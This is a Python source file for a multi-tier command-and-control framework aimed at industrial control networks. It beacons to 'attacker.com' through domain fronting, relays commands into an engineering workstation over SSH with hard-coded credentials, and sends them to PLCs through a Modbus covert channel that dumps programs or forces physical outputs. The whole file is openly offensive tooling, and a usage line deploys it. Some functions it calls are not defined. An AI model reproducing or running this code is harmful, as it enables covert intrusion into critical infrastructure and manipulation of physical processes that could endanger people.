# multi_tier_c2.py - Cascading C2 architecture for OT
import socket
import base64
import time
import json

class MultiTierC2:
    def __init__(self, tier_level, next_hop=None):
        self.tier = tier_level
        self.next_hop = next_hop  # IP of next tier
        self.command_queue = []

    def tier1_it_workstation(self):
        """
        Tier 1: Corporate IT network
        - Internet-connected
        - Relays commands to OT network
        """
        c2_server = "attacker.com"

        while True:
            # Beacon to external C2 (HTTPS)
            commands = self.https_beacon(c2_server)

            if commands:
                # Forward to Tier 2 (OT DMZ) via allowed protocol
                self.forward_to_tier2(commands)

            # Slow beacon (every 6 hours)
            time.sleep(21600)

    def https_beacon(self, c2_url):
        """
        HTTPS beacon with domain fronting
        Disguise as legitimate web traffic
        """
        import requests

        # Domain fronting: Use CDN to hide real C2
        headers = {
            'Host': 'attacker.com',  # Real C2
            'User-Agent': 'Mozilla/5.0...'  # Legitimate browser UA
        }

        try:
            response = requests.get(
                'https://cloudflare.com/update',  # CDN domain
                headers=headers,
                timeout=30
            )

            if response.status_code == 200:
                # Commands encoded in response
                commands = base64.b64decode(response.text)
                return json.loads(commands)

        except:
            pass

        return None

    def forward_to_tier2(self, commands):
        """
        Forward commands to Tier 2 (Engineering workstation in OT DMZ)
        Use protocol allowed through IT/OT firewall (e.g., RDP, SSH)
        """
        # Connect to EWS via allowed remote desktop protocol
        ews_ip = self.next_hop  # Engineering workstation
        ews_port = 3389  # RDP

        # Encode commands in RDP clipboard transfer
        # Or use SSH tunnel if SSH is allowed

        self.ssh_forward(ews_ip, commands)

    def ssh_forward(self, target_ip, data):
        """
        Forward data via SSH (if allowed through firewall)
        """
        import paramiko

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username='engineer', password='password')

        # Execute command on Tier 2
        stdin, stdout, stderr = ssh.exec_command(f'python3 tier2_agent.py "{base64.b64encode(json.dumps(data).encode()).decode()}"')

        ssh.close()

    def tier2_ot_dmz(self):
        """
        Tier 2: OT DMZ (Engineering workstation or SCADA server)
        - Cannot reach internet directly
        - Relays to process control network
        """
        while True:
            # Receive commands from Tier 1
            commands = self.check_tier1_commands()

            if commands:
                # Forward to PLCs via Modbus/S7/EtherNet/IP
                self.forward_to_plcs(commands)

            time.sleep(3600)  # Check hourly

    def forward_to_plcs(self, commands):
        """
        Forward commands to Tier 3 (PLCs)
        Use native industrial protocols
        """
        for plc in commands.get('target_plcs', []):
            if plc['protocol'] == 'modbus':
                self.modbus_c2_execute(plc['ip'], commands['action'])
            elif plc['protocol'] == 's7':
                self.s7_c2_execute(plc['ip'], commands['action'])

    def modbus_c2_execute(self, plc_ip, action):
        """
        Execute command via Modbus covert channel
        """
        from pymodbus.client import ModbusTcpClient

        client = ModbusTcpClient(plc_ip, port=502)
        client.connect()

        # Encode command in Modbus register (covert channel)
        # Register 1000: Command opcode
        # Register 1001-1010: Parameters

        if action['type'] == 'read_program':
            # Trigger PLC firmware backdoor to dump program
            client.write_register(1000, 0x01)  # Command: READ_PROGRAM
            time.sleep(2)
            program_data = client.read_holding_registers(1100, 100)  # Response registers

        elif action['type'] == 'modify_output':
            # Force output state
            client.write_register(1000, 0x02)  # Command: MODIFY_OUTPUT
            client.write_register(1001, action['output_id'])
            client.write_register(1002, action['new_state'])

        client.close()

# Usage - Deploy agents at each tier
tier1 = MultiTierC2(tier_level=1, next_hop="192.168.100.10")  # IT workstation
tier1.tier1_it_workstation()
